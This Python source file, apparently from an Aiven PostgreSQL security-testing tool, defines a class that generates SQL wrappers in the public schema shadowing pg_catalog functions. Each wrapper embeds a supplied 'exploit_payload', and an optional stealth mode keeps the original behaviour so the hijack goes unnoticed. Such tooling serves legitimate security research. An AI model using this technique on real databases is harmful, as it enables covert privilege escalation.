# Copyright (c) 2022 Aiven, Helsinki, Finland. https://aiven.io

from core.utils import convert_rettype, pgtype_get_names_map, get_test_value_for_type


class DBFunction:
    def __init__(self, name, params_type, initial_params_type, initial_rettype, exploit_payload, stealth_mode=True):
        self.name = name
        self.params_type = params_type
        self.initial_params_type = initial_params_type
        self.nparams = len(self.params_type)
        self.initial_rettype = initial_rettype
        self.rettype = convert_rettype(self.initial_rettype)
        self.created = False
        self.exploit_payload = exploit_payload
        self.stealth_mode = stealth_mode
        self.test_ok = False

        pg_type_names = pgtype_get_names_map()
        params_names = []
        test_params = []
        for p in self.params_type:
            params_names.append(pg_type_names[p])
            test_params.append(get_test_value_for_type(p))
        self.drop_query = "drop function public.%s(%s)" % (self.name, ", ".join(params_names))
        self.test_query = "select %s(%s)" % (self.name, ", ".join(test_params))

        argnames = "abcdefghijklmnopqrstuvwxyz"
        inargs = []
        callargs = []
        for i in range(0, self.nparams):
            inargs.append(f"IN {argnames[i]} {pg_type_names[self.params_type[i]]}")
            rtypecast = pg_type_names[self.initial_params_type[i]]
            callargs.append("%s%s" % (argnames[i], f"::{rtypecast}" if not rtypecast.startswith("any") else ""))
        inargs = ", ".join(inargs)
        callargs = ", ".join(callargs)

        if self.stealth_mode:
            base_qry = f"""
                create function public.{self.name}({inargs})
                returns {pg_type_names[self.rettype]} as
                $$
                    %s
                    select pg_catalog.{self.name}({callargs});
                $$
                language sql;
            """
        else:
            base_qry = f"""
                create function public.{self.name}({inargs})
                returns integer as
                $$
                    %s
                    select 1;
                $$
                language sql;
            """

        self.create_query_test = base_qry % "create function public.___test_wrapper() returns integer as 'select 1' language sql;"
        self.create_query_exploit = base_qry % self.exploit_payload

    def __str__(self):
        return "%s %s" % (self.name, ", ".join([str(i) for i in self.params_type]))
